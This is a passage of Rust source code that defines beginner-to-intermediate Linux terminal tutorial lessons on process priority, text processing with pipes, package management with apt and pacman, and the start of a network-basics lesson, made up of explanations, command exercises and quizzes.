                    content: "Process Priority and 'nice' values:\n\nEvery process has a priority (niceness) from -20 to 19:\n  -20 = Highest priority (least nice, hogs CPU)\n   0  = Default priority\n  19  = Lowest priority (most nice, yields CPU)\n\nCommands:\n  nice -n 10 command    - Start with lower priority (+10)\n  nice -n -5 command    - Start with higher priority (needs root)\n  renice 15 -p PID      - Change running process priority\n  top, then 'r'         - Renice in top (enter PID, then value)\n\nWhen to use:\n  • Running intensive backups: nice -n 15 backup.sh\n  • Encoding video: nice -n 10 ffmpeg ...\n  • Critical real-time app: sudo nice -n -10 app\n\nHigher nice value = lower priority = more CPU for other tasks.\nIt's called 'nice' because you're being nice by using less CPU!".to_string(),
                },
            },
            LessonStep {
                step_number: 12,
                title: "Completion: Process Management Mastered!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Excellent! You can now manage processes like a pro!\n\nKey commands learned:\n  ps                List current processes\n  ps aux            List ALL processes with details\n  ps aux | grep X   Find specific process\n  top               Real-time process monitor (q to quit)\n  htop              Better top (if installed)\n\nKilling processes:\n  kill PID          Polite termination (SIGTERM)\n  kill -9 PID       Force kill (SIGKILL)\n  pkill name        Kill by process name\n  killall name      Kill all processes with name\n\nBackground jobs:\n  command &         Run in background\n  jobs              List background jobs\n  fg                Bring to foreground\n  bg                Resume in background\n  Ctrl+Z            Pause current job\n  Ctrl+C            Kill current job\n\nPriority:\n  nice -n N cmd     Start with priority\n  renice N -p PID   Change priority\n\nNext: Master text processing with pipes!".to_string(),
                },
            },
        ],
    }
}

/// Create the "Text Processing" lesson
fn create_text_processing_lesson() -> Lesson {
    Lesson {
        id: "text-processing".to_string(),
        title: "Text Processing with Pipes".to_string(),
        description: "Master powerful text processing using grep, cut, sort, uniq, pipes, and basic sed/awk for data manipulation.".to_string(),
        difficulty: Difficulty::Intermediate,
        estimated_minutes: 20,
        prerequisites: vec!["file-viewing".to_string()],
        tags: vec!["intermediate".to_string(), "text".to_string(), "pipes".to_string()],
        setup: vec![
            SetupFile {
                path: "access.log".to_string(),
                contents: "192.168.1.10 - GET /index.html 200\n\
192.168.1.22 - GET /about.html 200\n\
192.168.1.10 - GET /docs 200\n\
10.0.0.5 - POST /login 401 ERROR bad password\n\
192.168.1.10 - GET /blog 200\n\
192.168.1.22 - GET /missing 404 ERROR not found\n\
10.0.0.5 - POST /login 200\n\
172.16.4.8 - GET /index.html 200\n\
192.168.1.10 - GET /contact 200\n\
172.16.4.8 - GET /broken 500 ERROR server fault\n\
192.168.1.22 - GET /index.html 200\n\
10.0.0.5 - GET /profile 200\n".to_string(),
            },
            SetupFile {
                path: "fruits.txt".to_string(),
                contents: "banana\napple\ncherry\napple\nbanana\napple\ndate\ncherry\n".to_string(),
            },
            SetupFile {
                path: "scores.txt".to_string(),
                contents: "alice:87\nbob:62\ncarol:95\ndave:78\nerin:95\n".to_string(),
            },
        ],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "The Power of Text Processing".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Welcome to Text Processing!\n\nLinux philosophy: Small, focused tools that do ONE thing well, combined through pipes.\n\nYou'll learn to:\n  • Chain commands with pipes (|)\n  • Filter text with grep patterns\n  • Extract columns with cut\n  • Sort and organize data\n  • Find unique entries with uniq\n  • Transform text with sed and awk\n\nThese tools turn the terminal into a data processing powerhouse!\n\nExample workflow:\n  cat access.log | grep ERROR | cut -d' ' -f1 | sort | uniq -c\n  ↑ read log → filter errors → extract IPs → sort → count unique\n\nLet's start simple and build up!".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "Introduction to Pipes".to_string(),
                instruction: "Pipes (|) send output from one command as input to another. Try: ls -l | grep txt".to_string(),
                hint: Some("Type: ls -l | grep txt".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ls -l | grep txt".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Perfect! The pipe takes 'ls -l' output and filters it through grep, showing only lines with 'txt'. Pipes are the foundation of text processing!".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Advanced grep Patterns".to_string(),
                instruction: "grep can use regular expressions. The -E flag enables extended regex. Try finding lines starting with numbers in /etc/services: grep -E '^[0-9]' /etc/services".to_string(),
                hint: Some("Type: grep -E '^[0-9]' /etc/services (^ means start of line, [0-9] means any digit)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "grep -E '^[0-9]' /etc/services".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Great! Regular expressions are powerful:\n  ^ = start of line\n  $ = end of line\n  . = any character\n  * = zero or more\n  + = one or more\n  [0-9] = any digit\n  [a-z] = any lowercase letter".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Showing Line Numbers and Context".to_string(),
                instruction: "grep -n shows line numbers. Try: grep -n http /etc/services | head -5".to_string(),
                hint: Some("Type: grep -n http /etc/services | head -5".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "grep -n http /etc/services | head -5".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Excellent! The -n flag adds line numbers. Other useful grep flags:\n  -v (invert, show non-matching)\n  -c (count matches)\n  -l (list filenames only)\n  -A 3 (show 3 lines After match)\n  -B 3 (show 3 lines Before match)\n  -C 3 (show 3 lines of Context)".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "Extracting Columns with cut".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "'cut' extracts specific columns from text.\n\nCommon uses:\n  cut -d':' -f1 /etc/passwd     Extract 1st field (usernames)\n  cut -d' ' -f1,3 file.txt      Extract fields 1 and 3\n  cut -c1-10 file.txt           Extract characters 1-10\n\nOptions:\n  -d 'delimiter'  - Field separator (default: tab)\n  -f fields       - Which field(s) to extract (1,2,3 or 1-5)\n  -c chars        - Character positions\n\nExample with /etc/passwd:\n  cat /etc/passwd | cut -d':' -f1,3\n  Shows username (field 1) and user ID (field 3)\n\nGreat for:\n  • CSV files (cut -d',')\n  • Log files (cut -d' ')\n  • Configuration files\n  • Tab-separated data".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Practice: Extract Usernames".to_string(),
                instruction: "Extract just the usernames (first field) from /etc/passwd. Use cut with colon delimiter: cut -d':' -f1 /etc/passwd".to_string(),
                hint: Some("Type: cut -d':' -f1 /etc/passwd".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "cut -d':' -f1 /etc/passwd".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Perfect! You've extracted all usernames. The /etc/passwd file uses colons as delimiters, and field 1 is the username. This is how you parse structured text files!".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Sorting Text with sort".to_string(),
                instruction: "The 'sort' command organizes lines alphabetically. Try sorting usernames: cut -d':' -f1 /etc/passwd | sort".to_string(),
                hint: Some("Type: cut -d':' -f1 /etc/passwd | sort".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "cut -d':' -f1 /etc/passwd | sort".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Excellent! sort arranges lines alphabetically. Useful flags:\n  -r (reverse order)\n  -n (numeric sort)\n  -k 2 (sort by column 2)\n  -u (unique, remove duplicates)\n  -t ':' (use : as delimiter)".to_string(),
                },
            },
            LessonStep {
                step_number: 8,
                title: "Quiz: Understanding Pipes".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "What does this command do: ps aux | grep python | wc -l".to_string(),
                    options: vec![
                        "Counts how many Python programs are installed".to_string(),
                        "Counts lines in Python scripts".to_string(),
                        "Counts how many running processes have 'python' in their name".to_string(),
                        "Shows Python version".to_string(),
                    ],
                    correct_index: 2,
                    explanation: "Correct! Let's break it down:\n  1. ps aux - List all processes\n  2. | grep python - Filter for lines containing 'python'\n  3. | wc -l - Count the lines (wc -l counts lines)\n\nSo it counts how many processes contain 'python' in their command/name. This is how you combine simple tools for complex tasks!".to_string(),
                },
            },
            LessonStep {
                step_number: 9,
                title: "Finding Unique Entries with uniq".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "'uniq' removes duplicate adjacent lines.\n\nIMPORTANT: Lines must be sorted first!\n\nCommon usage:\n  sort file.txt | uniq           Remove duplicates\n  sort file.txt | uniq -c        Count occurrences\n  sort file.txt | uniq -d        Show only duplicates\n  sort file.txt | uniq -u        Show only unique lines\n\nReal-world example:\n  cat access.log | cut -d' ' -f1 | sort | uniq -c | sort -rn\n  ↑ Get IPs from log → sort → count each → sort by frequency\n\nWhy sort first?\n  uniq only detects consecutive duplicates!\n  Without sort: a,b,a,a,b → a,b,a,b (only middle duplicates removed)\n  With sort:    a,a,a,b,b → a,b (all duplicates removed)\n\nPro tip: 'sort -u' combines sort + uniq in one command!".to_string(),
                },
            },
            LessonStep {
                step_number: 10,
                title: "Counting with wc".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "'wc' (word count) counts lines, words, and characters.\n\nUsage:\n  wc file.txt              Show lines, words, bytes\n  wc -l file.txt           Count lines only\n  wc -w file.txt           Count words only\n  wc -c file.txt           Count bytes/characters\n\nWith pipes:\n  ls | wc -l               Count files in directory\n  ps aux | wc -l           Count running processes\n  grep ERROR log | wc -l   Count errors in log\n  cat file | wc -w         Count words in file\n\nExample:\n  $ wc /etc/passwd\n    45   72  2594 /etc/passwd\n    ↑    ↑   ↑\n    lines words bytes\n\nQuick counts:\n  • How many users? → wc -l /etc/passwd\n  • How many files? → ls | wc -l\n  • How many errors? → grep ERROR log.txt | wc -l".to_string(),
                },
            },
            LessonStep {
                step_number: 11,
                title: "Introduction to sed".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "'sed' (stream editor) transforms text.\n\nBasic find-and-replace:\n  sed 's/old/new/' file.txt       Replace first occurrence per line\n  sed 's/old/new/g' file.txt      Replace all occurrences (global)\n  sed 's/old/new/gi' file.txt     Case-insensitive replacement\n\nDeleting lines:\n  sed '/pattern/d' file.txt       Delete lines matching pattern\n  sed '5d' file.txt               Delete line 5\n  sed '1,10d' file.txt            Delete lines 1-10\n\nPrinting specific lines:\n  sed -n '5p' file.txt            Print only line 5\n  sed -n '10,20p' file.txt        Print lines 10-20\n  sed -n '/ERROR/p' file.txt      Print lines with ERROR (like grep)\n\nReal examples:\n  sed 's/http/https/g' urls.txt   Change http to https\n  sed '/^$/d' file.txt            Remove empty lines\n  sed 's/  */ /g' file.txt        Replace multiple spaces with one\n\nNote: sed doesn't modify the file, just outputs transformed text.\nTo save: sed 's/old/new/g' file.txt > newfile.txt".to_string(),
                },
            },
            LessonStep {
                step_number: 12,
                title: "Introduction to awk".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "'awk' is a powerful text processing language.\n\nBasic syntax:\n  awk '{print $1}' file.txt       Print first field\n  awk '{print $1,$3}' file.txt    Print fields 1 and 3\n  awk '{print $NF}' file.txt      Print last field\n\nWith delimiters:\n  awk -F':' '{print $1}' /etc/passwd    Use : as delimiter\n  awk -F',' '{print $2}' data.csv       Use , for CSV\n\nFiltering:\n  awk '$3 > 100' file.txt         Print lines where field 3 > 100\n  awk '/ERROR/' file.txt          Print lines matching ERROR\n  awk '$1 == \"root\"' /etc/passwd  Print if field 1 equals root\n\nUseful built-ins:\n  $0  = entire line\n  $1  = first field\n  $NF = last field\n  NR  = line number\n  NF  = number of fields\n\nReal examples:\n  ps aux | awk '{print $1,$2,$11}'       User, PID, command\n  awk '{sum+=$1} END {print sum}' nums   Sum first column\n  awk 'length > 80' file.txt             Lines longer than 80 chars".to_string(),
                },
            },
            LessonStep {
                step_number: 13,
                title: "Practice: Complex Pipeline".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Let's build a complex pipeline step by step!\n\nTask: Find the 5 most common shells used by system users.\n\nPipeline:\n  cut -d':' -f7 /etc/passwd | sort | uniq -c | sort -rn | head -5\n\nBreaking it down:\n  1. cut -d':' -f7 /etc/passwd\n     Extract field 7 (login shell) from passwd\n\n  2. | sort\n     Sort shells alphabetically (required for uniq)\n\n  3. | uniq -c\n     Count occurrences of each unique shell\n\n  4. | sort -rn\n     Sort numerically (-n) in reverse (-r) order\n     (most common first)\n\n  5. | head -5\n     Show only top 5 results\n\nThis is the power of pipes! Small tools combined for complex analysis.\n\nTry modifying it:\n  • Top 10 instead of 5? Change head -5 to head -10\n  • Least common? Remove -r from sort\n  • Show all? Remove | head -5".to_string(),
                },
            },
            LessonStep {
                step_number: 14,
                title: "Quiz: Text Processing Mastery".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "Which command extracts unique IP addresses from an access log and counts them?".to_string(),
                    options: vec![
                        "cat access.log | grep -E '[0-9]+' | uniq".to_string(),
                        "cut -d' ' -f1 access.log | sort | uniq -c".to_string(),
                        "awk '{print $1}' access.log | count".to_string(),
                        "sed 's/.*([0-9.]+).*/\\1/' access.log".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! Breaking it down:\n  • cut -d' ' -f1 - Extract first field (IP address, space-delimited)\n  • sort - Sort IPs (required for uniq)\n  • uniq -c - Count unique occurrences\n\nAlternative with awk:\n  awk '{print $1}' access.log | sort | uniq -c\n\nWhy not the others?\n  • Option 1: No sort before uniq, won't work properly\n  • Option 3: No 'count' command exists\n  • Option 4: sed regex is overly complex and incomplete".to_string(),
                },
            },
            LessonStep {
                step_number: 15,
                title: "Completion: Text Processing Mastered!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Outstanding! You're now a text processing expert!\n\nKey commands:\n  grep pattern file          Search/filter text\n  grep -E '^[0-9]'          Extended regex\n  cut -d':' -f1 file        Extract columns\n  sort file                 Sort lines\n  sort -rn                  Reverse numeric sort\n  uniq                      Remove duplicates (needs sorted input)\n  uniq -c                   Count occurrences\n  wc -l                     Count lines\n  sed 's/old/new/g'         Find and replace\n  awk '{print $1}' file     Print first field\n\nPipe patterns:\n  cmd1 | cmd2 | cmd3        Chain commands\n  sort | uniq               Remove duplicates\n  sort | uniq -c            Count unique entries\n  grep pattern | wc -l      Count matches\n  cut | sort | uniq         Extract and deduplicate\n\nPro tips:\n  • Always sort before uniq\n  • Use -n with sort for numbers\n  • Combine awk/cut with pipes for complex parsing\n  • Test each pipe stage separately\n\nNext: Learn package management!".to_string(),
                },
            },
        ],
    }
}

/// Create the "Package Management" lesson
fn create_package_management_lesson() -> Lesson {
    Lesson {
        id: "package-mgmt".to_string(),
        title: "Package Management".to_string(),
        description: "Learn to install, update, and manage software packages using apt (Debian/Ubuntu) and pacman (Arch).".to_string(),
        difficulty: Difficulty::Beginner,
        estimated_minutes: 12,
        prerequisites: vec!["nav-basics".to_string()],
        tags: vec!["beginner".to_string(), "packages".to_string(), "system".to_string()],
        setup: vec![],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "What is Package Management?".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Welcome to Package Management!\n\nA 'package' is software bundled with:\n  • The program itself\n  • Dependencies (other software it needs)\n  • Configuration files\n  • Documentation\n  • Install/uninstall scripts\n\nPackage managers handle:\n  ✓ Installing software\n  ✓ Updating software\n  ✓ Removing software\n  ✓ Dependency resolution\n  ✓ Security updates\n\nCommon package managers:\n  • apt/apt-get (Debian, Ubuntu, Linux Mint)\n  • dnf/yum (Fedora, RHEL, CentOS)\n  • pacman (Arch, Manjaro)\n  • zypper (openSUSE)\n\nWe'll cover apt (most common) and pacman (fastest growing).\n\nNo more downloading .exe files from random websites!".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "apt Basics - Updating Package Lists".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "First rule of apt: Always update package lists first!\n\nCommand:\n  sudo apt update\n\nWhat it does:\n  • Downloads latest package information from repositories\n  • Checks which packages have updates available\n  • Does NOT install anything yet\n  • Should be run before installing or upgrading\n\nThink of it like:\n  • apt update = Check what's available in the store\n  • apt upgrade = Actually buy the new versions\n\nWhy sudo?\n  Package management affects the whole system, so it requires\n  administrator (root) privileges. 'sudo' gives you temporary\n  admin access.\n\nBest practice:\n  Run 'sudo apt update' daily or before installing anything.".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Quiz: Understanding apt update".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "What does 'sudo apt update' do?".to_string(),
                    options: vec![
                        "Installs all available updates immediately".to_string(),
                        "Downloads the list of available packages and updates".to_string(),
                        "Removes old packages".to_string(),
                        "Reboots the system".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! 'apt update' refreshes your package database - it downloads information about what packages are available and which versions are current. It does NOT install anything. Think of it as 'checking the menu' before ordering food. To actually install updates, you'd use 'apt upgrade'.".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Upgrading Installed Packages".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Keeping software updated is crucial for security!\n\nCommand:\n  sudo apt upgrade\n\nWhat it does:\n  • Upgrades all installed packages to latest versions\n  • Shows what will be upgraded before proceeding\n  • Asks for confirmation (y/n)\n  • Keeps your system secure and stable\n\nSafe upgrade workflow:\n  1. sudo apt update      (refresh package lists)\n  2. sudo apt upgrade     (install updates)\n\nFull upgrade (more aggressive):\n  sudo apt full-upgrade\n  • Upgrades packages even if it means removing some\n  • Use carefully, read what it plans to do!\n\nAutomatic yes:\n  sudo apt upgrade -y\n  • Automatically answers 'yes' to prompts\n  • Convenient for scripts\n  • Use carefully!".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "Installing Packages".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Installing software is simple with apt!\n\nCommand:\n  sudo apt install package-name\n\nExamples:\n  sudo apt install htop         # Better process viewer\n  sudo apt install curl         # Download tool\n  sudo apt install git          # Version control\n  sudo apt install neofetch     # System info display\n\nMultiple packages at once:\n  sudo apt install vim git curl htop\n\nWhat happens:\n  1. apt checks dependencies\n  2. Shows what will be installed\n  3. Asks for confirmation\n  4. Downloads packages\n  5. Installs everything\n  6. Runs post-install scripts\n\nTips:\n  • Read the confirmation message!\n  • Check disk space requirements\n  • Package names are case-sensitive\n  • Most packages have documentation in /usr/share/doc/".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Searching for Packages".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "How to find packages:\n\nSearch by name/description:\n  apt search keyword\n  apt search python | grep ^python3   # Filter results\n\nShow package details:\n  apt show package-name\n  • Shows description, version, size, dependencies\n  • Shows if it's installed\n  • Shows homepage and maintainer\n\nList installed packages:\n  apt list --installed\n  apt list --installed | grep python\n\nCheck if package is installed:\n  apt list --installed package-name\n  dpkg -l | grep package-name\n\nFind which package provides a file:\n  apt-file search /path/to/file\n  (requires: sudo apt install apt-file)\n\nExample workflow:\n  1. apt search \"video editor\"\n  2. apt show kdenlive\n  3. sudo apt install kdenlive".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Removing Packages".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Uninstalling software cleanly:\n\nRemove package (keep config files):\n  sudo apt remove package-name\n  • Removes the program\n  • Keeps configuration in /etc/ and ~/\n  • Useful if you might reinstall later\n\nComplete removal (including configs):\n  sudo apt purge package-name\n  • Removes everything\n  • Clean slate\n  • Use when you're sure you won't reinstall\n\nRemove orphaned dependencies:\n  sudo apt autoremove\n  • Removes packages that were dependencies\n  • But are no longer needed\n  • Safe to run regularly\n\nClean package cache:\n  sudo apt clean         # Remove all cached .deb files\n  sudo apt autoclean     # Remove only outdated cache\n\nFull cleanup workflow:\n  sudo apt remove package-name\n  sudo apt autoremove\n  sudo apt clean".to_string(),
                },
            },
            LessonStep {
                step_number: 8,
                title: "Quiz: Package Removal".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "What's the difference between 'apt remove' and 'apt purge'?".to_string(),
                    options: vec![
                        "They do exactly the same thing".to_string(),
                        "remove keeps config files, purge removes everything".to_string(),
                        "purge is faster than remove".to_string(),
                        "remove requires sudo, purge doesn't".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! 'apt remove' uninstalls the package but keeps configuration files (useful if you might reinstall). 'apt purge' removes EVERYTHING including configs. Example: If you remove then reinstall a database, 'remove' would keep your database config. 'purge' would give you a completely fresh start. Both require sudo.".to_string(),
                },
            },
            LessonStep {
                step_number: 9,
                title: "Introduction to pacman (Arch Linux)".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "pacman is the package manager for Arch Linux.\n\nBasic commands:\n  sudo pacman -Syu              Update system\n  sudo pacman -S package        Install package\n  sudo pacman -R package        Remove package\n  sudo pacman -Rns package      Remove package + dependencies\n  sudo pacman -Ss keyword       Search for packages\n  sudo pacman -Qi package       Package info (installed)\n  sudo pacman -Si package       Package info (repository)\n  sudo pacman -Qe               List explicitly installed\n  sudo pacman -Sc               Clean package cache\n\nFlag meanings:\n  -S = Sync (install/update from repos)\n  -R = Remove\n  -Q = Query (search installed)\n  -s = search\n  -y = refresh package database\n  -u = upgrade\n  -n = remove package-specific config\n  -s = remove unneeded dependencies\n\nCommon combinations:\n  -Syu = Sync database + upgrade all\n  -Ss = Sync search\n  -Rns = Remove + unneeded deps + configs".to_string(),
                },
            },
            LessonStep {
                step_number: 10,
                title: "apt vs pacman Comparison".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Quick reference: apt vs pacman\n\nUpdate package lists:\n  apt: sudo apt update\n  pacman: sudo pacman -Sy\n\nUpgrade all packages:\n  apt: sudo apt upgrade\n  pacman: sudo pacman -Syu\n\nInstall package:\n  apt: sudo apt install pkg\n  pacman: sudo pacman -S pkg\n\nRemove package:\n  apt: sudo apt remove pkg\n  pacman: sudo pacman -R pkg\n\nRemove package + deps:\n  apt: sudo apt autoremove pkg\n  pacman: sudo pacman -Rns pkg\n\nSearch packages:\n  apt: apt search keyword\n  pacman: pacman -Ss keyword\n\nShow package info:\n  apt: apt show pkg\n  pacman: pacman -Si pkg\n\nList installed:\n  apt: apt list --installed\n  pacman: pacman -Qe\n\nClean cache:\n  apt: sudo apt clean\n  pacman: sudo pacman -Sc".to_string(),
                },
            },
            LessonStep {
                step_number: 11,
                title: "Package Management Best Practices".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Golden rules for package management:\n\n1. Update regularly:\n   sudo apt update && sudo apt upgrade\n   Do this weekly or before installing new software\n\n2. Read before confirming:\n   Check what will be installed/removed!\n   Especially important for 'full-upgrade' or 'autoremove'\n\n3. Don't mix package managers:\n   Use ONE primary package manager\n   Don't mix apt with snap, or pip system-wide packages\n   Use virtual environments for Python/Node packages\n\n4. Be careful with PPAs (apt) or AUR (Arch):\n   Third-party repositories can be unsafe\n   Only add trusted sources\n\n5. Keep backups:\n   Before major upgrades, backup important data\n   Upgrades rarely break things, but be prepared\n\n6. Clean up regularly:\n   sudo apt autoremove && sudo apt clean\n   Removes orphaned packages and cached files\n\n7. Check logs if something fails:\n   /var/log/apt/history.log (apt)\n   /var/log/pacman.log (pacman)".to_string(),
                },
            },
            LessonStep {
                step_number: 12,
                title: "Completion: Package Management Mastered!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Great job! You can now manage software like a pro!\n\napt (Debian/Ubuntu) commands:\n  sudo apt update              Refresh package lists\n  sudo apt upgrade             Install updates\n  sudo apt install pkg         Install package\n  sudo apt remove pkg          Uninstall package\n  sudo apt purge pkg           Uninstall + remove configs\n  sudo apt autoremove          Remove orphaned dependencies\n  sudo apt search keyword      Find packages\n  apt show pkg                 Package details\n  apt list --installed         List installed packages\n\npacman (Arch) commands:\n  sudo pacman -Syu             Update system\n  sudo pacman -S pkg           Install package\n  sudo pacman -R pkg           Remove package\n  sudo pacman -Rns pkg         Remove + dependencies + configs\n  sudo pacman -Ss keyword      Search packages\n  pacman -Qi pkg               Package info\n\nBest practices:\n  ✓ Update before installing\n  ✓ Read confirmation prompts\n  ✓ Clean up regularly\n  ✓ Use one package manager\n  ✓ Keep backups\n\nNext: Learn networking basics!".to_string(),
                },
            },
        ],
    }
}

/// Create the "Network Basics" lesson
fn create_network_basics_lesson() -> Lesson {
    Lesson {
        id: "network-basics".to_string(),
        title: "Network Basics".to_string(),
        description: "Learn essential networking commands: ping for connectivity testing, curl and wget for downloads, and basic ssh usage.".to_string(),
        difficulty: Difficulty::Beginner,
        estimated_minutes: 12,
        prerequisites: vec!["nav-basics".to_string()],
        tags: vec!["beginner".to_string(), "network".to_string(), "internet".to_string()],
        setup: vec![],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "Introduction to Network Commands".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Welcome to Network Basics!\n\nThe terminal is powerful for network operations:\n  • Testing connectivity\n  • Downloading files\n  • Remote server access\n  • Troubleshooting issues\n  • Automating web requests\n\nYou'll learn:\n  • ping - Test if a host is reachable\n  • curl - Transfer data from URLs\n  • wget - Download files\n  • ssh - Secure remote access\n  • Basic connectivity troubleshooting\n\nThese tools are essential for:\n  • System administrators\n  • Web developers\n  • DevOps engineers\n  • Anyone managing remote servers\n\nLet's get connected!".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "Testing Connectivity with ping".to_string(),
                instruction: "ping sends packets to a host to test connectivity. Try pinging Google: ping -c 4 google.com".to_string(),
                hint: Some("Type: ping -c 4 google.com (-c 4 means send 4 packets then stop)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ping -c 4 google.com".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Perfect! ping shows:\n  • If the host is reachable\n  • Response time (latency) in milliseconds\n  • Packet loss percentage\n\nLower time = faster connection. 0% packet loss = good connection!".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Understanding ping Output".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Decoding ping results:\n\nPING google.com (142.250.185.46): 56 data bytes\n64 bytes from 142.250.185.46: icmp_seq=0 ttl=116 time=12.4 ms\n64 bytes from 142.250.185.46: icmp_seq=1 ttl=116 time=11.8 ms\n\nKey information:\n  • IP address: 142.250.185.46 (DNS resolved google.com)\n  • icmp_seq: Sequence number (detects missing packets)\n  • ttl: Time To Live (hops remaining, typically 64 or 128)\n  • time: Round-trip time in milliseconds\n\nStatistics:\n  4 packets transmitted, 4 received, 0% packet loss\n  round-trip min/avg/max = 11.8/12.1/12.4 ms\n\nWhat's good?\n  • 0% packet loss = excellent\n  • <50ms = great for most uses\n  • <100ms = acceptable\n  • >200ms = noticeable lag\n  • >500ms = poor connection\n\nUse cases:\n  • Is my internet working? → ping 8.8.8.8 (Google DNS)\n  • Can I reach this server? → ping example.com\n  • Network troubleshooting".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Quiz: Understanding ping".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "What does 'ping -c 10 example.com' do?".to_string(),
                    options: vec![
                        "Downloads the website 10 times".to_string(),
                        "Sends 10 test packets to example.com to check connectivity".to_string(),
                        "Connects to example.com 10 times per second".to_string(),
                        "Checks if port 10 is open on example.com".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! The -c flag specifies count. 'ping -c 10' sends exactly 10 ICMP echo request packets, waits for replies, then stops and shows statistics. Without -c, ping runs forever (stop with Ctrl+C). This tests if the host is reachable and measures network latency.".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "Downloading with curl".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "'curl' transfers data from or to a server.\n\nBasic usage:\n  curl https://example.com              Display page content\n  curl -o file.html https://example.com Download to file\n  curl -O https://site.com/file.zip     Download, keep name\n  curl -L https://short.url             Follow redirects\n\nUseful flags:\n  -o filename    Save to specified filename\n  -O             Save with remote filename\n  -L             Follow redirects (important!)\n  -I             Show headers only\n  -s             Silent mode (no progress)\n  -v             Verbose (show details)\n  -u user:pass   Authentication\n\nAPI requests:\n  curl https://api.github.com/users/octocat\n  curl -X POST -d 'data' https://api.example.com\n  curl -H 'Authorization: token' https://api.com\n\nTesting:\n  curl -I https://example.com    Check if site is up\n  curl https://ifconfig.me       Show your public IP".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Practice: Using curl".to_string(),
                instruction: "Try fetching your public IP address using curl: curl -s https://ifconfig.me".to_string(),
                hint: Some("Type: curl -s https://ifconfig.me (-s makes it silent/no progress bar)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "curl -s https://ifconfig.me".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Great! You just fetched your public IP address. The -s flag suppresses the progress bar. curl is incredibly versatile - it's like a Swiss Army knife for web requests!".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Downloading Files with wget".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
